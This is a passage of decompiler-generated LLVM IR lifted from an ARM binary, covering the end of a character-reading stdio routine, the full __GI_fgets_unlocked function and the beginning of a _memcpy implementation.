  %v5_1a69c = add i32 %v4_1a69c, %v2_1a6d0
  %v1_1a6a0 = add i32 %v5_1a69c, 39
  %v2_1a6a0 = inttoptr i32 %v1_1a6a0 to i8*
  %v3_1a6a0 = load i8, i8* %v2_1a6a0, align 1
  %v4_1a6a0 = zext i8 %v3_1a6a0 to i32
  %v1_1a6a4 = add nsw i32 %v5_1a68c, -1
  store i32 %v1_1a6a4, i32* %r2.global-to-local, align 4
  %v3_1a6a8 = sdiv i32 %v1_1a6a4, 256
  store i32 %v3_1a6a8, i32* %r1.global-to-local, align 4
  store i32 %v4_1a6a0, i32* %r0.global-to-local, align 4
  %v2_1a6b4 = add i32 %v2_1a6d0, 40
  %v3_1a6b4 = inttoptr i32 %v2_1a6b4 to i32*
  store i32 0, i32* %v3_1a6b4, align 4
  %v0_1a6b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a6b8 = trunc i32 %v0_1a6b8 to i8
  %v2_1a6b8 = load i32, i32* @r4, align 4
  %v3_1a6b8 = inttoptr i32 %v2_1a6b8 to i8*
  store i8 %v1_1a6b8, i8* %v3_1a6b8, align 1
  br label %dec_label_pc_1a6f4

dec_label_pc_1a6c0:                               ; preds = %dec_label_pc_1a684
  %v1_1a6c0 = add i32 %v2_1a6d0, 16
  store i32 %v1_1a6c0, i32* %r1.global-to-local, align 4
  %v1_1a6c4 = inttoptr i32 %v1_1a6c0 to i32*
  %v2_1a6c4 = load i32, i32* %v1_1a6c4, align 4
  store i32 %v2_1a6c4, i32* %r1.global-to-local, align 4
  %v3_1a6c4 = add i32 %v2_1a6d0, 20
  %v4_1a6c4 = inttoptr i32 %v3_1a6c4 to i32*
  %v5_1a6c4 = load i32, i32* %v4_1a6c4, align 4
  %v9_1a6c8 = icmp eq i32 %v5_1a6c4, %v2_1a6c4
  br i1 %v9_1a6c8, label %dec_label_pc_1a6d8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1a6c0
  %v2_1a6cc = inttoptr i32 %v2_1a6c4 to i8*
  %v3_1a6cc = load i8, i8* %v2_1a6cc, align 1
  %v4_1a6cc = zext i8 %v3_1a6cc to i32
  store i32 %v4_1a6cc, i32* %r0.global-to-local, align 4
  %v6_1a6cc = add i32 %v2_1a6c4, 1
  store i32 %v6_1a6cc, i32* %r1.global-to-local, align 4
  store i32 %v6_1a6cc, i32* %v1_1a6c4, align 4
  br label %dec_label_pc_1a764

dec_label_pc_1a6d8:                               ; preds = %dec_label_pc_1a6c0
  %v1_1a6d8 = add i32 %v2_1a6d0, 4
  %v2_1a6d8 = inttoptr i32 %v1_1a6d8 to i32*
  %v3_1a6d8 = load i32, i32* %v2_1a6d8, align 4
  %v4_1a6e0 = icmp eq i32 %v3_1a6d8, -2
  br i1 %v4_1a6e0, label %dec_label_pc_1a6e4, label %dec_label_pc_1a6fc

dec_label_pc_1a6e4:                               ; preds = %dec_label_pc_1a6d8
  %v1_1a6e4 = or i32 %v5_1a68c, 4
  store i32 %v1_1a6e4, i32* %r2.global-to-local, align 4
  store i8 %v2_1a684, i8* %v1_1a684, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a6f4

dec_label_pc_1a6f4:                               ; preds = %dec_label_pc_1a698, %dec_label_pc_1a6e4
  %v0_1a6f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a6f4 = trunc i32 %v0_1a6f4 to i8
  %v2_1a6f4 = load i32, i32* @r4, align 4
  %v3_1a6f4 = add i32 %v2_1a6f4, 1
  %v4_1a6f4 = inttoptr i32 %v3_1a6f4 to i8*
  store i8 %v1_1a6f4, i8* %v4_1a6f4, align 1
  br label %dec_label_pc_1a764

dec_label_pc_1a6fc:                               ; preds = %dec_label_pc_1a6d8
  %v1_1a6fc = and i32 %v4_1a68c, 768
  %v2_1a6fc = icmp eq i32 %v1_1a6fc, 0
  br i1 %v2_1a6fc, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_1a6fc
  store i32 ptrtoint (i32** @global_var_2e204.1327 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1a6fc, %bb19
  store i32 108296, i32* @lr, align 4
  %v1_1a704 = xor i1 %v2_1a6fc, true
  call void @__pseudo_cond_branch(i1 %v1_1a704, i32 ptrtoint (i32* @global_var_1a468.1613 to i32))
  %v0_1a708 = load i32, i32* @r4, align 4
  %v1_1a708 = add i32 %v0_1a708, 8
  store i32 %v1_1a708, i32* %r2.global-to-local, align 4
  %v1_1a70c = inttoptr i32 %v1_1a708 to i32*
  %v2_1a70c = load i32, i32* %v1_1a70c, align 4
  store i32 %v2_1a70c, i32* %r2.global-to-local, align 4
  %v3_1a70c = add i32 %v0_1a708, 12
  %v4_1a70c = inttoptr i32 %v3_1a70c to i32*
  %v5_1a70c = load i32, i32* %v4_1a70c, align 4
  %v9_1a710 = icmp eq i32 %v5_1a70c, %v2_1a70c
  br i1 %v9_1a710, label %dec_label_pc_1a744, label %dec_label_pc_1a718

dec_label_pc_1a718:                               ; preds = %bb20
  %v2_1a718 = add i32 %v0_1a708, 24
  %v3_1a718 = inttoptr i32 %v2_1a718 to i32*
  store i32 %v2_1a70c, i32* %v3_1a718, align 4
  %v0_1a71c = load i32, i32* @r4, align 4
  store i32 %v0_1a71c, i32* %r0.global-to-local, align 4
  %v2_1a720 = call i32 @__stdio_rfill(i32 %v0_1a71c)
  store i32 %v2_1a720, i32* %r0.global-to-local, align 4
  %v2_1a724 = icmp eq i32 %v2_1a720, 0
  br i1 %v2_1a724, label %dec_label_pc_1a760, label %dec_label_pc_1a72c

dec_label_pc_1a72c:                               ; preds = %dec_label_pc_1a718
  %v0_1a72c = load i32, i32* @r4, align 4
  %v1_1a72c = add i32 %v0_1a72c, 20
  %v2_1a72c = inttoptr i32 %v1_1a72c to i32*
  %v3_1a72c = load i32, i32* %v2_1a72c, align 4
  %v2_1a730 = add i32 %v0_1a72c, 24
  %v3_1a730 = inttoptr i32 %v2_1a730 to i32*
  store i32 %v3_1a72c, i32* %v3_1a730, align 4
  %v0_1a734 = load i32, i32* @r4, align 4
  %v1_1a734 = add i32 %v0_1a734, 16
  %v2_1a734 = inttoptr i32 %v1_1a734 to i32*
  %v3_1a734 = load i32, i32* %v2_1a734, align 4
  %v1_1a738 = inttoptr i32 %v3_1a734 to i8*
  %v2_1a738 = load i8, i8* %v1_1a738, align 1
  %v3_1a738 = zext i8 %v2_1a738 to i32
  store i32 %v3_1a738, i32* %r0.global-to-local, align 4
  %v5_1a738 = add i32 %v3_1a734, 1
  store i32 %v5_1a738, i32* %v2_1a734, align 4
  br label %dec_label_pc_1a764

dec_label_pc_1a744:                               ; preds = %bb20
  %v1_1a744 = inttoptr i32 %v0_1a708 to i8*
  store i32 %v0_1a708, i32* %r0.global-to-local, align 4
  %v2_1a748 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_1a748, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1a750 = call i32 @__stdio_READ(i8* %v1_1a744, i32 %v2_1a748, i32 1)
  store i32 %v5_1a750, i32* %r0.global-to-local, align 4
  %v2_1a754 = icmp eq i32 %v5_1a750, 0
  br i1 %v2_1a754, label %dec_label_pc_1a760, label %bb21

bb21:                                             ; preds = %dec_label_pc_1a744
  %v4_1a758 = load i8, i8* %stack_var_-9, align 1
  %v5_1a758 = sext i8 %v4_1a758 to i32
  store i32 %v5_1a758, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a764

dec_label_pc_1a760:                               ; preds = %dec_label_pc_1a744, %dec_label_pc_1a674, %dec_label_pc_1a718
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a764

dec_label_pc_1a764:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_1a72c, %dec_label_pc_1a6f4, %dec_label_pc_1a760
  %v2_1a768 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a768, i32* @r4, align 4
  %v8_1a768 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_1a768

; uselistorder directives
  uselistorder i32 %v2_1a6c4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a688, { 1, 0 }
  uselistorder i32 %v2_1a6d0, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_1a644, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32** @global_var_2e204.1327, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32** @global_var_2e204.1327 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_1a764, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_1a760, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1a6f4, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a774 = icmp eq i32 %arg2, 0
  store i1 %v2_1a774, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp21 = icmp slt i32 %arg2, 1
  br i1 %tmp21, label %dec_label_pc_1a7f8, label %dec_label_pc_1a7e0.preheader

dec_label_pc_1a7e0.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_1a7e02 = add i32 %arg2, -1
  store i32 %v1_1a7e02, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1a7e08 = icmp eq i32 %arg2, 1
  store i1 %v7_1a7e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a7e08, label %dec_label_pc_1a7e8, label %dec_label_pc_1a78c

dec_label_pc_1a78c:                               ; preds = %dec_label_pc_1a7e0.preheader, %dec_label_pc_1a7e0.backedge.dec_label_pc_1a78c_crit_edge
  %v0_1a7b0 = phi i32 [ %v0_1a78c.pre, %dec_label_pc_1a7e0.backedge.dec_label_pc_1a78c_crit_edge ], [ %arg3, %dec_label_pc_1a7e0.preheader ]
  %v1_1a78c = add i32 %v0_1a7b0, 16
  %v2_1a78c = inttoptr i32 %v1_1a78c to i32*
  %v3_1a78c = load i32, i32* %v2_1a78c, align 4
  store i32 %v3_1a78c, i32* %r2.global-to-local, align 4
  %v1_1a790 = add i32 %v0_1a7b0, 24
  %v2_1a790 = inttoptr i32 %v1_1a790 to i32*
  %v3_1a790 = load i32, i32* %v2_1a790, align 4
  store i32 %v3_1a790, i32* %r3.global-to-local, align 4
  %v3_1a794 = icmp uge i32 %v3_1a78c, %v3_1a790
  store i1 %v3_1a794, i1* %cpsr_c.global-to-local, align 1
  %v9_1a794 = icmp eq i32 %v3_1a78c, %v3_1a790
  store i1 %v9_1a794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a794, label %dec_label_pc_1a7b0, label %dec_label_pc_1a79c

dec_label_pc_1a79c:                               ; preds = %dec_label_pc_1a78c
  %v1_1a79c = inttoptr i32 %v3_1a78c to i8*
  %v2_1a79c = load i8, i8* %v1_1a79c, align 1
  %v3_1a79c = zext i8 %v2_1a79c to i32
  store i32 %v3_1a79c, i32* %r3.global-to-local, align 4
  %v5_1a79c = add i32 %v3_1a78c, 1
  store i32 %v5_1a79c, i32* %r2.global-to-local, align 4
  %v2_1a7a0 = load i32, i32* @r5, align 4
  %v3_1a7a0 = inttoptr i32 %v2_1a7a0 to i8*
  store i8 %v2_1a79c, i8* %v3_1a7a0, align 1
  %v4_1a7a0 = load i32, i32* @r5, align 4
  %v5_1a7a0 = add i32 %v4_1a7a0, 1
  store i32 %v5_1a7a0, i32* @r5, align 4
  %v0_1a7a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a7a4 = icmp ugt i32 %v0_1a7a4, 9
  store i1 %v2_1a7a4, i1* %cpsr_c.global-to-local, align 1
  %v7_1a7a4 = icmp eq i32 %v0_1a7a4, 10
  store i1 %v7_1a7a4, i1* %cpsr_z.global-to-local, align 1
  %v0_1a7a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a7a8 = load i32, i32* @r4, align 4
  %v2_1a7a8 = add i32 %v1_1a7a8, 16
  %v3_1a7a8 = inttoptr i32 %v2_1a7a8 to i32*
  store i32 %v0_1a7a8, i32* %v3_1a7a8, align 4
  br i1 %v7_1a7a4, label %dec_label_pc_1a7e8, label %dec_label_pc_1a7e0.backedge

dec_label_pc_1a7b0:                               ; preds = %dec_label_pc_1a78c
  %v1_1a7b4 = inttoptr i32 %v0_1a7b0 to i8*
  %v2_1a7b4 = call i32 @getc_unlocked(i8* %v1_1a7b4)
  %v3_1a7b8 = icmp eq i32 %v2_1a7b4, -1
  store i1 %v3_1a7b8, i1* %cpsr_c.global-to-local, align 1
  %v8_1a7b8 = icmp eq i32 %v2_1a7b4, -1
  store i1 %v8_1a7b8, i1* %cpsr_z.global-to-local, align 1
  %v1_1a7bc = urem i32 %v2_1a7b4, 256
  store i32 %v1_1a7bc, i32* %r3.global-to-local, align 4
  br i1 %v3_1a7b8, label %dec_label_pc_1a7c4, label %dec_label_pc_1a7dc

dec_label_pc_1a7c4:                               ; preds = %dec_label_pc_1a7b0
  %v0_1a7c4 = load i32, i32* @r4, align 4
  %v1_1a7c4 = add i32 %v0_1a7c4, 1
  %v2_1a7c4 = inttoptr i32 %v1_1a7c4 to i8*
  %v3_1a7c4 = load i8, i8* %v2_1a7c4, align 1
  %v4_1a7c4 = zext i8 %v3_1a7c4 to i32
  store i32 %v4_1a7c4, i32* %r3.global-to-local, align 4
  %v1_1a7c8 = and i32 %v4_1a7c4, 8
  %v2_1a7c8 = icmp eq i32 %v1_1a7c8, 0
  store i1 %v2_1a7c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a7c8, label %dec_label_pc_1a7e8, label %dec_label_pc_1a7f8

dec_label_pc_1a7dc:                               ; preds = %dec_label_pc_1a7b0
  %v1_1a7d4 = trunc i32 %v2_1a7b4 to i8
  %v2_1a7d4 = load i32, i32* @r5, align 4
  %v3_1a7d4 = inttoptr i32 %v2_1a7d4 to i8*
  store i8 %v1_1a7d4, i8* %v3_1a7d4, align 1
  %v4_1a7d4 = load i32, i32* @r5, align 4
  %v5_1a7d4 = add i32 %v4_1a7d4, 1
  store i32 %v5_1a7d4, i32* @r5, align 4
  %v0_1a7d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a7d8 = icmp ugt i32 %v0_1a7d8, 9
  store i1 %v2_1a7d8, i1* %cpsr_c.global-to-local, align 1
  %v7_1a7d8 = icmp eq i32 %v0_1a7d8, 10
  store i1 %v7_1a7d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a7d8, label %dec_label_pc_1a7e8, label %dec_label_pc_1a7e0.backedge

dec_label_pc_1a7e0.backedge:                      ; preds = %dec_label_pc_1a7dc, %dec_label_pc_1a79c
  %v0_1a7e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a7e0 = add i32 %v0_1a7e0, -1
  store i32 %v1_1a7e0, i32* %r6.global-to-local, align 4
  %v2_1a7e0 = icmp ne i32 %v0_1a7e0, 0
  store i1 %v2_1a7e0, i1* %cpsr_c.global-to-local, align 1
  %v7_1a7e0 = icmp eq i32 %v0_1a7e0, 1
  store i1 %v7_1a7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a7e0, label %dec_label_pc_1a7e8, label %dec_label_pc_1a7e0.backedge.dec_label_pc_1a78c_crit_edge

dec_label_pc_1a7e0.backedge.dec_label_pc_1a78c_crit_edge: ; preds = %dec_label_pc_1a7e0.backedge
  %v0_1a78c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a78c

dec_label_pc_1a7e8:                               ; preds = %dec_label_pc_1a7dc, %dec_label_pc_1a7e0.backedge, %dec_label_pc_1a79c, %dec_label_pc_1a7e0.preheader, %dec_label_pc_1a7c4
  %v0_1a7e8 = load i32, i32* @r5, align 4
  %v1_1a7e8 = load i32, i32* %r7.global-to-local, align 4
  %v3_1a7e8 = icmp uge i32 %v0_1a7e8, %v1_1a7e8
  store i1 %v3_1a7e8, i1* %cpsr_c.global-to-local, align 1
  %v9_1a7e8 = icmp eq i32 %v0_1a7e8, %v1_1a7e8
  store i1 %v9_1a7e8, i1* %cpsr_z.global-to-local, align 1
  %v2_1a7ec = xor i1 %v9_1a7e8, true
  %v3_1a7ec = and i1 %v3_1a7e8, %v2_1a7ec
  br i1 %v3_1a7ec, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1a7e8
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1a7f0 = inttoptr i32 %v0_1a7e8 to i8*
  store i8 0, i8* %v7_1a7f0, align 1
  %v0_1a7f4.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1a7f4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1a7e8, %bb
  %v1_1a7f4 = phi i1 [ %v1_1a7f4.pre, %bb ], [ %v9_1a7e8, %dec_label_pc_1a7e8 ]
  %v0_1a7f4 = phi i1 [ %v0_1a7f4.pre, %bb ], [ %v3_1a7e8, %dec_label_pc_1a7e8 ]
  %v2_1a7f4 = xor i1 %v1_1a7f4, true
  %v3_1a7f4 = and i1 %v0_1a7f4, %v2_1a7f4
  br i1 %v3_1a7f4, label %.dec_label_pc_1a7fc_crit_edge, label %dec_label_pc_1a7f8

.dec_label_pc_1a7fc_crit_edge:                    ; preds = %.thread14
  %v0_1a7fc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a7fc

dec_label_pc_1a7f8:                               ; preds = %entry, %dec_label_pc_1a7c4, %.thread14
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a7fc

dec_label_pc_1a7fc:                               ; preds = %.dec_label_pc_1a7fc_crit_edge, %dec_label_pc_1a7f8
  %v0_1a7fc = phi i32 [ %v0_1a7fc.pre, %.dec_label_pc_1a7fc_crit_edge ], [ 0, %dec_label_pc_1a7f8 ]
  ret i32 %v0_1a7fc

; uselistorder directives
  uselistorder i1 %v9_1a7e8, { 1, 0, 2 }
  uselistorder i32 %v1_1a7e8, { 1, 0 }
  uselistorder i32 %v0_1a7e8, { 0, 2, 1 }
  uselistorder i32 %v0_1a7e0, { 2, 0, 1 }
  uselistorder i32 %v0_1a7d8, { 1, 0 }
  uselistorder i32 %v2_1a7b4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1a7a4, { 1, 0 }
  uselistorder i32 %v3_1a78c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1a7b0, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 (i8*)* @getc_unlocked, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1a7fc, { 1, 0 }
  uselistorder label %dec_label_pc_1a7f8, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1a7e8, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1a78c, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_1a810 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a810 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a810 = sub i32 %v0_1a810, %v1_1a810
  %v3_1a810 = icmp ult i32 %v0_1a810, %v1_1a810
  %v4_1a810 = xor i32 %v1_1a810, %v0_1a810
  %v5_1a810 = xor i32 %v2_1a810, %v0_1a810
  %v6_1a810 = and i32 %v5_1a810, %v4_1a810
  %v7_1a810 = icmp slt i32 %v6_1a810, 0
  store i1 %v7_1a810, i1* %cpsr_v.global-to-local, align 1
  %v8_1a810 = icmp slt i32 %v2_1a810, 0
  store i1 %v8_1a810, i1* %cpsr_n.global-to-local, align 1
  %v9_1a810 = icmp eq i32 %v0_1a810, %v1_1a810
  store i1 %v9_1a810, i1* @cpsr_z, align 1
  br i1 %v3_1a810, label %dec_label_pc_1aa5c, label %dec_label_pc_1a818

dec_label_pc_1a818:                               ; preds = %entry
  br i1 %v9_1a810, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_1a818
  %merge = phi i32 [ %v0_1a810, %dec_label_pc_1a818 ], [ %v2_1aaf0, %bb143 ], [ %v11_1ab0c, %bb146 ], [ %v7_1ab0c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_1a818
  %v5_1a81c = inttoptr i32 %v1_1a810 to i8*
  store i8* %v5_1a81c, i8** %stack_var_-8, align 4
  %v0_1a820 = load i32, i32* @r2, align 4
  %v2_1a820 = add i32 %v0_1a820, -4
  store i32 %v2_1a820, i32* %r2.global-to-local, align 4
  %v4_1a820 = sub i32 3, %v0_1a820
  %v5_1a820 = and i32 %v4_1a820, %v0_1a820
  %v6_1a820 = icmp slt i32 %v5_1a820, 0
  store i1 %v6_1a820, i1* %cpsr_v.global-to-local, align 1
  %v7_1a820 = icmp slt i32 %v2_1a820, 0
  store i1 %v7_1a820, i1* %cpsr_n.global-to-local, align 1
  %v5_1a824 = icmp slt i32 %v0_1a820, 4
  br i1 %v5_1a824, label %bb133, label %dec_label_pc_1a828

dec_label_pc_1a828:                               ; preds = %bb
  %v1_1a828 = urem i32 %v1_1a810, 4
  store i32 %v1_1a828, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a828 = icmp eq i32 %v1_1a828, 0
  br i1 %v2_1a828, label %dec_label_pc_1a830, label %dec_label_pc_1a8d4

dec_label_pc_1a830:                               ; preds = %dec_label_pc_1a828
  %v1_1a830 = urem i32 %v0_1a810, 4
  store i32 %v1_1a830, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a830 = icmp eq i32 %v1_1a830, 0
  %extract.t = trunc i32 %v0_1a810 to i2
  br i1 %v2_1a830, label %dec_label_pc_1a838, label %dec_label_pc_1a904

dec_label_pc_1a838:                               ; preds = %dec_label_pc_1a830, %dec_label_pc_1a8fc
  %v0_1a85093 = phi i32 [ %v1_1a810, %dec_label_pc_1a830 ], [ %v0_1a94c76, %dec_label_pc_1a8fc ]
  %v0_1a84c92 = phi i32 [ %v0_1a810, %dec_label_pc_1a830 ], [ %v0_1a8fc, %dec_label_pc_1a8fc ]
  %v0_1a838 = phi i32 [ %v2_1a820, %dec_label_pc_1a830 ], [ %v2_1a8f4, %dec_label_pc_1a8fc ]
  %v2_1a838 = add i32 %v0_1a838, -8
  store i32 %v2_1a838, i32* %r2.global-to-local, align 4
  %v4_1a838 = sub i32 7, %v0_1a838
  %v5_1a838 = and i32 %v4_1a838, %v0_1a838
  %v6_1a838 = icmp slt i32 %v5_1a838, 0
  store i1 %v6_1a838, i1* %cpsr_v.global-to-local, align 1
  %v7_1a838 = icmp slt i32 %v2_1a838, 0
  store i1 %v7_1a838, i1* %cpsr_n.global-to-local, align 1
  %v5_1a83c = icmp slt i32 %v0_1a838, 8
  br i1 %v5_1a83c, label %dec_label_pc_1a88c, label %dec_label_pc_1a840

dec_label_pc_1a840:                               ; preds = %dec_label_pc_1a838
  %v2_1a840 = add i32 %v0_1a838, -28
  store i32 %v2_1a840, i32* %r2.global-to-local, align 4
  %v4_1a840 = sub i32 27, %v0_1a838
  %v5_1a840 = and i32 %v4_1a840, %v2_1a838
  %v6_1a840 = icmp slt i32 %v5_1a840, 0
  store i1 %v6_1a840, i1* %cpsr_v.global-to-local, align 1
  %v7_1a840 = icmp slt i32 %v2_1a840, 0
  store i1 %v7_1a840, i1* %cpsr_n.global-to-local, align 1
  %v5_1a844 = icmp slt i32 %v2_1a838, 20
  br i1 %v5_1a844, label %dec_label_pc_1a878, label %dec_label_pc_1a848

dec_label_pc_1a848:                               ; preds = %dec_label_pc_1a840
  %v0_1a848 = load i32, i32* @r4, align 4
  store i32 %v0_1a848, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a84c

dec_label_pc_1a84c:                               ; preds = %dec_label_pc_1a84c.dec_label_pc_1a84c_crit_edge, %dec_label_pc_1a848
  %v0_1a850 = phi i32 [ %v12_1a858, %dec_label_pc_1a84c.dec_label_pc_1a84c_crit_edge ], [ %v0_1a85093, %dec_label_pc_1a848 ]
  %v0_1a84c = phi i32 [ %v0_1a84c.pre, %dec_label_pc_1a84c.dec_label_pc_1a84c_crit_edge ], [ %v0_1a84c92, %dec_label_pc_1a848 ]
  %v1_1a84c = inttoptr i32 %v0_1a84c to i32*
  %v2_1a84c = load i32, i32* %v1_1a84c, align 4
  %v3_1a84c = add i32 %v0_1a84c, 4
  %v4_1a84c = inttoptr i32 %v3_1a84c to i32*
  %v5_1a84c = load i32, i32* %v4_1a84c, align 4
  store i32 %v5_1a84c, i32* %r4.global-to-local, align 4
  %v6_1a84c = add i32 %v0_1a84c, 8
  %v7_1a84c = inttoptr i32 %v6_1a84c to i32*
  %v8_1a84c = load i32, i32* %v7_1a84c, align 4
  store i32 %v8_1a84c, i32* %ip.global-to-local, align 4
  %v9_1a84c = add i32 %v0_1a84c, 12
  %v10_1a84c = inttoptr i32 %v9_1a84c to i32*
  %v11_1a84c = load i32, i32* %v10_1a84c, align 4
  store i32 %v11_1a84c, i32* %lr.global-to-local, align 4
  %v12_1a84c = add i32 %v0_1a84c, 16
  store i32 %v12_1a84c, i32* %r1.global-to-local, align 4
  %v1_1a850 = inttoptr i32 %v0_1a850 to i32*
  store i32 %v2_1a84c, i32* %v1_1a850, align 4
  %v3_1a850 = add i32 %v0_1a850, 4
  %v4_1a850 = inttoptr i32 %v3_1a850 to i32*
  %v5_1a850 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a850, i32* %v4_1a850, align 4
  %v6_1a850 = add i32 %v0_1a850, 8
  %v7_1a850 = inttoptr i32 %v6_1a850 to i32*
  %v8_1a850 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_1a850, i32* %v7_1a850, align 4
  %v9_1a850 = add i32 %v0_1a850, 12
  %v10_1a850 = inttoptr i32 %v9_1a850 to i32*
  %v11_1a850 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1a850, i32* %v10_1a850, align 4
  %v12_1a850 = add i32 %v0_1a850, 16
  store i32 %v12_1a850, i32* %r0.global-to-local, align 4
  %v0_1a854 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a854 = inttoptr i32 %v0_1a854 to i32*
  %v2_1a854 = load i32, i32* %v1_1a854, align 4
  store i32 %v2_1a854, i32* @r3, align 4
  %v3_1a854 = add i32 %v0_1a854, 4
  %v4_1a854 = inttoptr i32 %v3_1a854 to i32*
  %v5_1a854 = load i32, i32* %v4_1a854, align 4
  store i32 %v5_1a854, i32* %r4.global-to-local, align 4
  %v6_1a854 = add i32 %v0_1a854, 8
  %v7_1a854 = inttoptr i32 %v6_1a854 to i32*
  %v8_1a854 = load i32, i32* %v7_1a854, align 4
  store i32 %v8_1a854, i32* @ip, align 4
  %v9_1a854 = add i32 %v0_1a854, 12
  %v10_1a854 = inttoptr i32 %v9_1a854 to i32*
  %v11_1a854 = load i32, i32* %v10_1a854, align 4
  store i32 %v11_1a854, i32* @lr, align 4
  %v12_1a854 = add i32 %v0_1a854, 16
  store i32 %v12_1a854, i32* %r1.global-to-local, align 4
  %v1_1a858 = inttoptr i32 %v12_1a850 to i32*
  store i32 %v2_1a854, i32* %v1_1a858, align 4
  %v3_1a858 = add i32 %v0_1a850, 20
  %v4_1a858 = inttoptr i32 %v3_1a858 to i32*
  %v5_1a858 = load i32, i32* %r4.global-to-local, align 4
